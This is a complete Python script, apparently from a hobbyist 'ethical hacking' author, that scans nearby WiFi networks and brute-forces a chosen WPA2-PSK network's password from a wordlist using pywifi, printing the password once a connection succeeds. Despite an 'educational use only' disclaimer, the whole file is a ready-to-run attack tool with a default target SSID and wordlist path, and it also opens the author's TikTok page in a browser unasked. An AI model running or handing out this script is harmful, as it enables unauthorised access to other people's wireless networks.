 #!/usr/bin/env python3
# -*- coding: utf-8 -*-
# HackCrist WiFi Brute Force Audit Script - Advanced Version
# For Educational and Ethical Use Only. Do NOT use on networks without explicit permission.

import sys
import os
import platform
import argparse
import time
import pywifi
from pywifi import PyWiFi, const, Profile
import webbrowser

# --- Configuración Inicial ---
# Estas variables se usarán por defecto si no se especifican argumentos de línea de comandos.
DEFAULT_SSID = "Dfone"
DEFAULT_WORDLIST_PATH = r"C:\Users\Sajal\Desktop\password.txt" # Considerar una ruta absoluta o relativa

# --- Colores para la Terminal ---
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"

# --- Inicialización de la Interfaz WiFi ---
wifi_manager = None
wifi_interface = None

def initialize_wifi_interface(interface_index: int = 0):
    """
    Inicializa el gestor WiFi y selecciona una interfaz.
    """
    global wifi_manager, wifi_interface
    try:
        wifi_manager = PyWiFi()
        interfaces = wifi_manager.interfaces()
        if not interfaces:
            print(f"{RED}[-] Error: No se encontraron interfaces WiFi. Asegúrate de que tu adaptador WiFi esté activo y funcionando.{RESET}")
            sys.exit(1)
        
        if interface_index >= len(interfaces) or interface_index < 0:
            print(f"{YELLOW}[!] Advertencia: Índice de interfaz inválido. Usando la primera interfaz disponible.{RESET}")
            interface_index = 0

        wifi_interface = interfaces[interface_index]
        print(f"{GREEN}[+] Interfaz WiFi '{wifi_interface.name()}' seleccionada.{RESET}")
        
        # Desconectar cualquier conexión previa para asegurar un estado limpio
        wifi_interface.disconnect()
        time.sleep(1) # Pequeña espera para que la desconexión se complete
        
    except Exception as e:
        print(f"{RED}[-] Error al inicializar la interfaz WiFi: {e}{RESET}")
        print(f"{YELLOW}[?] Asegúrate de tener 'wpa_supplicant' ejecutándose en Linux o los drivers correctos en Windows.{RESET}")
        sys.exit(1)

def clear_console():
    """Limpia la consola para una mejor visualización."""
    os.system("cls" if platform.system().lower().startswith("win") else "clear")

def scan_networks() -> list:
    """
    Escanea y lista las redes WiFi disponibles.
    """
    if not wifi_interface:
        print(f"{RED}[-] La interfaz WiFi no está inicializada. No se puede escanear.{RESET}")
        return []
    
    print(f"{BLUE}[~] Escaneando redes WiFi disponibles...{RESET}")
    wifi_interface.scan()
    time.sleep(5)  # Esperar a que el escaneo se complete
    
    aps = wifi_interface.scan_results()
    if not aps:
        print(f"{YELLOW}[!] No se encontraron redes WiFi en el escaneo.{RESET}")
        return []
    
    print(f"{CYAN}[+] Redes WiFi encontradas:{RESET}")
    unique_ssids = set()
    network_list = []
    for i, ap in enumerate(aps):
        ssid = ap.ssid.strip()
        if ssid and ssid not in unique_ssids:
            unique_ssids.add(ssid)
            network_list.append(ap)
            print(f"  {i+1}. {BOLD}{ap.ssid}{RESET} (Señal: {ap.signal} dBm)")
    return network_list

def connect_and_check(ssid: str, password: str, attempt_number: int) -> bool:
    """
    Intenta conectar a la red WiFi con la contraseña proporcionada y verifica el estado.

    Args:
        ssid (str): El SSID de la red WiFi.
        password (str): La contraseña a intentar.
        attempt_number (int): El número de intento actual.

    Returns:
        bool: True si la conexión fue exitosa, False en caso contrario.
    """
    if not wifi_interface:
        print(f"{RED}[-] La interfaz WiFi no está inicializada. No se puede conectar.{RESET}")
        return False

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP # CCMP es para AES (WPA2-PSK)
    profile.key = password

    try:
        wifi_interface.remove_all_network_profiles()
        tmp_profile = wifi_interface.add_network_profile(profile)

        wifi_interface.connect(tmp_profile)
        time.sleep(3)  # Aumentado el tiempo de espera para la conexión

        if wifi_interface.status() == const.IFACE_CONNECTED:
            print(f"{BOLD}{GREEN}[+] ¡ÉXITO! Contraseña encontrada: {password}{RESET}")
            wifi_interface.disconnect()
            return True
        else:
            print(f"{RED}[{attempt_number}] Falló con: {password}{RESET}")
            # Intentar desconectar y limpiar para el siguiente intento
            if wifi_interface.status() != const.IFACE_DISCONNECTED:
                wifi_interface.disconnect()
            time.sleep(0.5) # Breve pausa antes del siguiente intento
            return False
    except Exception as e:
        print(f"{RED}[-] Error durante el intento de conexión para '{password}': {e}{RESET}")
        if wifi_interface.status() != const.IFACE_DISCONNECTED:
            wifi_interface.disconnect()
        time.sleep(0.5)
        return False

def process_wordlist(ssid: str, file_path: str):
    """
    Procesa el archivo de wordlist, intentando cada contraseña.

    Args:
        ssid (str): El SSID de la red WiFi.
        file_path (str): La ruta al archivo de la wordlist.
    """
    attempt_number = 0
    start_time = time.time()
    
    try:
        with open(file_path, 'r', encoding='utf8') as words:
            total_lines = sum(1 for _ in open(file_path, 'r', encoding='utf8'))
            words.seek(0) # Volver al inicio del archivo
            
            print(f"{BLUE}[~] Iniciando ataque de fuerza bruta en {BOLD}'{ssid}'{RESET}{BLUE} con wordlist: '{file_path}' ({total_lines} contraseñas){RESET}")
            
            for line in words:
                attempt_number += 1
                pwd = line.strip()
                if not pwd: # Saltar líneas vacías
                    continue

                # Opcional: Mostrar progreso más detallado
                if attempt_number % 50 == 0 or attempt_number == 1:
                    print(f"\n{CYAN}--- Progreso: {attempt_number}/{total_lines} intentos ---{RESET}")

                if connect_and_check(ssid, pwd, attempt_number):
                    end_time = time.time()
                    duration = end_time - start_time
                    print(f"{GREEN}[+] Proceso completado en {duration:.2f} segundos.{RESET}")
                    sys.exit(0) # Salir si se encuentra la contraseña

    except FileNotFoundError:
        print(f"{RED}[-] Error: El archivo de wordlist '{file_path}' no se encontró.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{RED}[-] Ocurrió un error al leer la wordlist o durante el ataque: {e}{RESET}")
        sys.exit(1)
    
    end_time = time.time()
    duration = end_time - start_time
    print(f"\n{BLUE}[~] Se han probado todas las contraseñas en la wordlist. No se encontró ninguna contraseña.{RESET}")
    print(f"{BLUE}[~] Proceso finalizado en {duration:.2f} segundos.{RESET}")


def main():
    """Función principal para parsear argumentos y ejecutar el proceso."""
    parser = argparse.ArgumentParser(
        description=f'{BOLD}HackCrist WiFi Audit Script - Versión Avanzada{RESET}\n'
                    f'Uso educativo solamente. No usar sin permiso explícito.',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        '-s', '--ssid',
        metavar='SSID_DE_RED',
        type=str,
        help=f'El SSID (nombre) de la red WiFi a auditar. Por defecto: "{DEFAULT_SSID}"'
    )
    parser.add_argument(
        '-w', '--wordlist',
        metavar='RUTA_WORDLIST',
        type=str,
        help=f'La ruta al archivo de wordlist. Por defecto: "{DEFAULT_WORDLIST_PATH}"'
    )
    parser.add_argument(
        '-i', '--interface',
        metavar='INDICE_INTERFAZ',
        type=int,
        default=0,
        help=f'El índice de la interfaz WiFi a usar (ej. 0 para wlan0). Por defecto: 0'
    )
    parser.add_argument(
        '-l', '--list-networks',
        action='store_true',
        help='Lista las redes WiFi disponibles y sale.'
    )

    args = parser.parse_args()

    clear_console()
    print(CYAN + "[+] Ejecutando en " + BOLD + platform.system() + " " + platform.machine() + RESET)
    time.sleep(1.5)

    initialize_wifi_interface(args.interface)

    if args.list_networks:
        scan_networks()
        sys.exit(0)

    ssid_to_use = args.ssid
    wordlist_to_use = args.wordlist if args.wordlist else DEFAULT_WORDLIST_PATH

    # Si no se especificó un SSID, permitir selección interactiva o usar el por defecto
    if not ssid_to_use:
        available_networks = scan_networks()
        if available_networks:
            print(f"{BLUE}[~] Por favor, selecciona el número de la red a auditar o presiona Enter para usar '{DEFAULT_SSID}': {RESET}")
            selection = input(f"{CYAN}>> {RESET}").strip()
            if selection.isdigit() and 1 <= int(selection) <= len(available_networks):
                ssid_to_use = available_networks[int(selection) - 1].ssid
                print(f"{GREEN}[+] Red seleccionada: {BOLD}{ssid_to_use}{RESET}")
            else:
                ssid_to_use = DEFAULT_SSID
                print(f"{YELLOW}[!] Selección inválida o vacía. Usando SSID por defecto: '{DEFAULT_SSID}'{RESET}")
        else:
            ssid_to_use = DEFAULT_SSID
            print(f"{YELLOW}[!] No se pudieron escanear redes. Usando SSID por defecto: '{DEFAULT_SSID}'{RESET}")

    if not ssid_to_use:
        print(f"{RED}[-] Error: No se ha especificado un SSID para auditar y no se pudo obtener uno.{RESET}")
        sys.exit(1)

    if os.path.exists(wordlist_to_use):
        clear_console()
        process_wordlist(ssid_to_use, wordlist_to_use)
    else:
        print(f"{RED}[-] Error: El archivo de wordlist especificado '{wordlist_to_use}' no fue encontrado.{RESET}")
        print(f"{BLUE}[?] Asegúrate de que la ruta sea correcta o especifica una con -w/--wordlist.{RESET}")
        sys.exit(1)

# --- Ejecución del Script ---
if __name__ == "__main__":
    main()

    # Mensajes finales y enlace de TikTok
    print("\n[+] ¡Gracias por usar HackCrist WiFi Audit!")
    print("[+] Sigue mi TikTok para más contenido: @ethicalcore")
    try:
        webbrowser.open("https://www.tiktok.com/@ethicalcore?_t=ZT-8xeJ7JR4paQ&_r=1")
    except Exception as e:
        print(f"{YELLOW}[-] No se pudo abrir el navegador web automáticamente: {e}{RESET}")
